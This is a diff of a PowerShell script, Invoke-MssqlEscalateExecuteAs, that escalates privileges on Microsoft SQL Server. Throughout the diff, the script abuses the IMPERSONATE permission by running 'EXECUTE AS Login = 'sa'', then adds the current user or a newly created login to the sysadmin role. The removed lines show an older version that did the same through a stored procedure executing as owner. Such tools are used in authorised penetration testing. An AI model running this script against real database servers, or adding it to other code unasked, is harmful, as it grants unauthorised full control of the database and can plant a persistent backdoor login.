@@ -8,8 +8,7 @@ function Invoke-MssqlEscalateExecuteAs
 	   This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
        In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
        privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
-       the existing user.  Finally, I've provided an option to execute an arbitrary query as each of the user
-       that can be impersonated.
+       the existing user.  
 
 	.EXAMPLE
 	   Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.
@@ -151,7 +150,7 @@ function Invoke-MssqlEscalateExecuteAs
         $Checksysadmin = $_.IsSysAdmin
         if ($Checksysadmin -ne 0){
                 Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
-                Write-Host "[*] Done."
+                Write-Host "[*] All Done."
                 Break             
         }
     }
@@ -250,22 +249,23 @@ function Invoke-MssqlEscalateExecuteAs
            $conn.Close()
         }
     }
-    break
+
+
     # -------------------------------------------------
     # Attempt to escalate privileges
     # -------------------------------------------------
 
-    # Get number database wwhere the user is db_owner
+    # Verify that a sysadmin user can be impersonated
     $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count 
-
     if ($ImpUserSysadminsCount -ne 0) {      
-        
-        # Set db to be used for escalating privs # fix this
-        $TableDBOwner | Select-Object db -first 1 | foreach {
-            $ElevateOnDb = $_.db            
-        }
 
-        # Add new user if provided
+        # Status user
+        Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation..."  
+
+        # Open db connection
+        $conn.Open()
+
+        # Check if we are going to add a new sysadmin or elevate the current one for query
         if ($newuser -and $newPass){
             $AddUser = "CREATE LOGIN $newuser WITH PASSWORD = '$newPass'"
             $UsertoElevate = $newuser
@@ -276,77 +276,64 @@ function Invoke-MssqlEscalateExecuteAs
             $Message = ""
         }
 
-        # Status user
-        Write-Host "[*] $ConnectUser has db_owner role in $DbOwnerRoleCount of the databases." -foreground "green"
-        Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via the $ElevateOnDb database..."      
+        # Setup query
+        $QueryElevate = "EXECUTE AS Login = 'sa';
+        $AddUser;
+        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin';"
 
-        # Set authentication type and create connection string for the targeted database 
-        if($SqlUser -and $SqlPass){   
-           
-            # SQL login
-            $conn.Close()
-            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;User ID=$SqlUser;Password=$SqlPass;"
-            [string]$ConnectUser = $SqlUser
-        }else{
-          
-            # Trusted connection
-            $conn.Close()
-            $conn.ConnectionString = "Server=$SqlServerInstance;Database=$ElevateOnDb;Integrated Security=SSPI;"
-            $UserDomain = [Environment]::UserDomainName
-            $Username =  [Environment]::UserName
-            $ConnectUser = "$UserDomain\$Username"
-       
-        }
+        # Execute query
+        $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+        $results = $cmd.ExecuteReader() 
 
-	# Create stored procedures to escalate privileges
-        $conn.Open()
-        $QueryElevate = "CREATE PROCEDURE sp_elevate_me
-        WITH EXECUTE AS OWNER
-        AS
-        begin
-        $AddUser
-        EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin'
-        end"
-	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-	$results = $cmd.ExecuteReader() 
+        # Close db connection
         $conn.Close()         
 
-	# Execute stored procedures to escalate privileges
-        $conn.Open()
-        $QueryElevate = "EXEC sp_elevate_me"
-	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-	$results = $cmd.ExecuteReader() 
-        $conn.Close() 
+        # -------------------------------------------------
+        # Verify privilege escalation worked
+        # -------------------------------------------------
 
-	# Remove stored procedure
-        $conn.Open()
-        $QueryElevate = "drop proc sp_elevate_me"
-	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-	$results = $cmd.ExecuteReader() 
-        $conn.Close() 
+        # Status user
+        Write-Host "[*] Verifying that $UsertoElevate was added to the sysadmin role..."
 
-	# Verify that privilege escalation works
+	    # Verify that privilege escalation works
         If (-Not ($newuser -and $newPass)){
+
+            # Open db connection
             $conn.Open()
-            $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
-            $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+
+            # Setup query
+            $Query = "select IS_SRVROLEMEMBER('sysadmin','$UsertoElevate') as status"
+
+            # Execute query
+            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
+
+            # Parse query results
             $results = $cmd.ExecuteReader() 
-            $TableCheckforSysadmin.Load($results) 
-            $conn.Close() 
+            $TableVerify = New-Object System.Data.DataTable
+            $TableVerify.Load($results)  
 
-            $TableCheckforSysadmin | Select-Object -First 1 IsSysAdmin | foreach {
 
-                $Checksysadmin2 = $_.IsSysAdmin
-                if ($Checksysadmin2 -ne 0){
-                    Write-Host "[*] Success! - $UsertoElevate is now a sysadmin." -foreground "green" 
-                }else{
-                    Write-Host "[*] Sorry, something failed, no sysadmin for you." -foreground "red"
-                }
-            }    
+            # Get sysadmin status
+            $TableVerify | Select-Object status | foreach {
+                $VerifySysadmin = $_.status
+            }
+
+            write-host "blah stuff: $VerifySysadmin"
+
+            # Verify sysadmin status
+            if ($VerifySysadmin -ne 0){
+                Write-Host "[*] Success - $UsertoElevate is now a sysadmin!" -foreground "green"
+                Write-Host "[*] All Done."          
+            }else{
+                Write-Host "[*] Failed - Something went wrong!." -foreground "red"
+                Write-Host "[*] All Done."
+            }           
+            
+            # Close db connection
+            $conn.Close()     
          }       
     }else{
-         Write-Host "[*] Sorry, $ConnectUser doesn't have the db_owner role in any of the sysadmin databases." -foreground "red" 
-    }
-    
-	Write-Host "[*] All done." 
+         Write-Host "[*] Sorry, the $ConnectUser account can't impersonate anyone that is a sysadmin ." -foreground "red" 
+         Write-Host "[*] All done." 
+    }    	
 }
